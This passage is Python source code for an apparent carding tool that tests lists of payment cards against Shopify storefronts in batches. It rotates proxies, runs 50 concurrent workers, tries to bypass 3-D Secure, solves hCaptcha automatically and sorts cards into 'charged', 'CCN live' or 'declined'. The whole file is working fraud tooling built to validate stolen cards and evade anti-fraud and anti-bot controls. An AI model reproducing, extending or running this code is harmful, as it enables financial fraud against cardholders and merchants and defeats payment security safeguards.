        receipt_id = receipt.get("id")
        if receipt.get("__typename") == "ProcessingReceipt":
            for poll_i in range(8):
                await asyncio.sleep(min(0.25 + poll_i * 0.06, 0.7))
                poll_r = await session.post(graphql_url, headers=graphql_headers, json={"query": _POLL_QUERY, "variables": {"receiptId": receipt_id, "sessionToken": session_token}, "operationName": "PollForReceipt"})
                if poll_r.status_code != 200:
                    continue
                poll_data = poll_r.json()
                rec = poll_data.get("data", {}).get("receipt", {}) or {}
                rtn = rec.get("__typename")
                if rtn == "ProcessedReceipt" or rec.get("orderIdentity"):
                    return {"status": "Charged", "message": "CARD CHARGED", "order_id": rec.get("orderIdentity", {}).get("id"), "product": product_title, "price": price}
                if rtn == "ActionRequiredReceipt":
                    bypass = await try_3ds_bypass(rec.get("action", {}).get("offsiteRedirect", {}).get("url", site_url), proxy_url)
                    if bypass.get("bypassed"):
                        return {"status": "Charged", "message": "CARD CHARGED (3DS bypassed)"}
                    return {"status": "Approved", "message": "3DS Required (bypass failed)", "error_code": "3DS_REQUIRED", "product": product_title, "price": price}
                if rtn == "FailedReceipt":
                    err = rec.get("processingError", {}) or {}
                    code = err.get("code", "UNKNOWN")
                    msg_orig = err.get("messageUntranslated", "") or err.get("message", "")
                    live = classify_ccn_live(code)
                    if live:
                        return {"status": "Charged", "message": f"CCN LIVE — {code}", "error_code": code, "ccn_live": True, "product": product_title, "price": price}
                    return {"status": "Declined", "message": "Card declined", "error_code": code, "gateway_message": msg_orig, "product": product_title, "price": price}
            return {"status": "Error", "message": "Poll timeout", "product": product_title, "price": price}

    return {"status": "Error", "message": "Submit failed (no receipt)", "product": product_title, "price": price}

# ═══════════════════════════════════════════════════════════════════════
# CAPTCHA RETRY WRAPPER
# ═══════════════════════════════════════════════════════════════════════
async def run_shopify_check_with_retry(site_url, card_str, proxy_url=None, timeout=120.0, verbose=True):
    result = await run_shopify_check(site_url, card_str, proxy_url=proxy_url, timeout=timeout, verbose=verbose)
    if not _is_captcha_result(result):
        return result
    retries_left = _CAPTCHA_MAX_RETRIES
    while retries_left > 0:
        retries_left -= 1
        _log_verbose(verbose, "🤖 CAPTCHA detected — attempting Playwright bypass...")
        checkout_url = result.get("_checkout_url") or f"{site_url.rstrip('/')}/checkout"
        solver = await solve_hcaptcha_playwright(checkout_url, proxy_url=proxy_url, timeout=55)
        if not solver.get("solved"):
            _log_verbose(verbose, f"⚠️ CAPTCHA solver failed: {solver.get('error')}")
            break
        _log_verbose(verbose, "✅ CAPTCHA solved — retrying check...")
        result = await run_shopify_check(site_url, card_str, proxy_url=proxy_url, timeout=timeout, verbose=verbose)
        if not _is_captcha_result(result):
            return result
    return result

# ═══════════════════════════════════════════════════════════════════════
# BATCH WORKER
# ═══════════════════════════════════════════════════════════════════════
async def _process_one_site(site, card, proxy_list, semaphore, results_lock, results, verbose=True):
    """Process a single site with a card, respecting the semaphore."""
    async with semaphore:
        proxy = random.choice(proxy_list) if proxy_list else None
        try:
            result = await run_shopify_check_with_retry(site, card, proxy_url=proxy, timeout=120, verbose=verbose)
            status = result.get("status", "Error")
            is_ccn_live = result.get("ccn_live", False)
            message = result.get("message", "")
            product = result.get("product", "")
            price = result.get("price", "")
            order_id = result.get("order_id", "")

            async with results_lock:
                if status == "Charged" and is_ccn_live:
                    results["CCN Live"] += 1
                    print(f"\033[93m💰 CCN LIVE: {site} | Card: {card[:8]}... | {message}\033[0m")
                elif status == "Charged":
                    results["Charged"] += 1
                    print(f"\033[92m✅ CHARGED: {site} | Card: {card[:8]}... | Order: {order_id} | ${price}\033[0m")
                elif status == "Approved":
                    results["Approved"] += 1
                    print(f"\033[93m⚠️  APPROVED: {site} | Card: {card[:8]}... | {message}\033[0m")
                elif status == "Declined":
                    results["Declined"] += 1
                    print(f"\033[91m❌ DECLINED: {site} | Card: {card[:8]}... | {result.get('error_code')}\033[0m")
                else:
                    results["Error"] += 1
                    print(f"\033[90m⚠️  ERROR: {site} | Card: {card[:8]}... | {message[:80]}\033[0m")
            return result
        except Exception as e:
            async with results_lock:
                results["Error"] += 1
                print(f"\033[90m⚠️  EXCEPTION: {site} | {str(e)[:80]}\033[0m")
            return {"status": "Error", "message": str(e)[:200]}

# ═══════════════════════════════════════════════════════════════════════
# INTERACTIVE MAIN
# ═══════════════════════════════════════════════════════════════════════
def _print_banner():
    GREEN = "\033[92m"
    RESET = "\033[0m"
    print(f"""
{GREEN}╔══════════════════════════════════════════════════════════╗
║  ⚡  X CBC AUTOMATION  v1.1.0 (BATCH)                    ║
║  50 Workers | TXT Cards | TXT Sites | Terms Bypass Try   ║
╚══════════════════════════════════════════════════════════╝{RESET}
""")


def _ask(prompt, default=""):
    try:
        v = input(prompt).strip()
        return v or default
    except (EOFError, KeyboardInterrupt):
        return default


def _load_sites():
    print("\n[1] Site source:")
    print("    [a] TXT file (e.g. sites.txt)")
    print("    [b] Paste multiple sites")
    choice = _ask("   Choose (a/b): ", "a").lower()
    sites = []
    if choice == "a":
        path = _ask("   TXT filename: ")
        try:
            with open(path, "r", encoding="utf-8") as f:
                sites = [line.strip().rstrip("/") for line in f if line.strip() and not line.startswith("#")]
            print(f"   ✅ {len(sites)} sites loaded")
        except Exception as e:
            print(f"   ❌ File read failed: {e}")
    else:
        print("   Enter sites one by one (empty line to finish):")
        while True:
            s = _ask("   > ")
            if not s:
                break
            if not s.startswith("http"):
                s = "https://" + s
            sites.append(s.rstrip("/"))
        print(f"   ✅ {len(sites)} sites accepted")
    return sites


def _load_cards_from_txt(path):
    """Load cards from TXT file (one card per line: cc|mm|yy|cvv)."""
    try:
        with open(path, "r", encoding="utf-8") as f:
            lines = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        valid = []
        for line in lines:
            parts = line.replace(" ", "").split("|")
            if len(parts) == 4:
                valid.append(line)
        print(f"   ✅ {len(valid)} cards loaded from {path}")
        return valid
    except Exception as e:
        print(f"   ❌ File read failed: {e}")
        return []


async def main():
    _print_banner()

    sites = _load_sites()
    if not sites:
        print("❌ No sites.")
        return

    print("\n[2] Card source:")
    print("    [a] Single card (enter now)")
    print("    [b] TXT file (cards.txt)")
    card_choice = _ask("   Choose (a/b): ", "b").lower()

    cards = []
    if card_choice == "a":
        card = _ask("   Format (cc|mm|yy|cvv): ")
        if len(card.split("|")) != 4:
            print("❌ Invalid card format.")
            return
        cards = [card]
    else:
        card_file = _ask("   TXT filename (cards.txt): ", "cards.txt")
        cards = _load_cards_from_txt(card_file)
        if not cards:
            print("❌ No valid cards.")
            return

    print("\n[3] Proxy (optional — press Enter to skip):")
    print("    - Single: host:port")
    print("    - Auth: user:pass@host:port")
    print("    - List: ip1:port1,ip2:port2")
    print("    - File: file:proxies.txt")
    proxy_input = _ask("   Proxy: ").strip()
    proxies = load_proxy_list(proxy_input) if proxy_input else []
    if not proxies and proxy_input:
        fmt = format_proxy(proxy_input)
        if fmt:
            proxies = [fmt]
    if proxies:
        print(f"   ✅ {len(proxies)} proxies loaded")
    else:
        print("   ⏭️  No proxy — direct connection")

    # Total combinations
    total = len(sites) * len(cards)
    print(f"\n[4] Checking {len(sites)} sites × {len(cards)} cards = {total} combinations")
    print(f"    50 workers concurrent | Terms bypass enabled | CAPTCHA retry enabled\n")

    # Build task list (all combinations)
    tasks = []
    for site in sites:
        for card in cards:
            tasks.append((site, card))
    random.shuffle(tasks)

    results = {"Charged": 0, "CCN Live": 0, "Approved": 0, "Declined": 0, "Error": 0}
    results_lock = asyncio.Lock()
    semaphore = asyncio.Semaphore(MAX_CONCURRENT_CHECKS)

    # Run all tasks concurrently with semaphore
    coros = [_process_one_site(site, card, proxies, semaphore, results_lock, results, verbose=True) for site, card in tasks]
    await asyncio.gather(*coros, return_exceptions=True)

    print(f"\n{'═' * 60}")
    print("📊 BATCH SUMMARY")
    print(f"{'═' * 60}")
    print(f"   ✅ Charged:  {results['Charged']}")
    print(f"   💰 CCN Live: {results['CCN Live']}")
    print(f"   ⚠️  Approved: {results['Approved']}")
    print(f"   ❌ Declined: {results['Declined']}")
    print(f"   ⚠️  Error:    {results['Error']}")
    print(f"   📦 Total:    {total}")
    print(f"{'═' * 60}\n")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n⏹️  Stopped by user.")
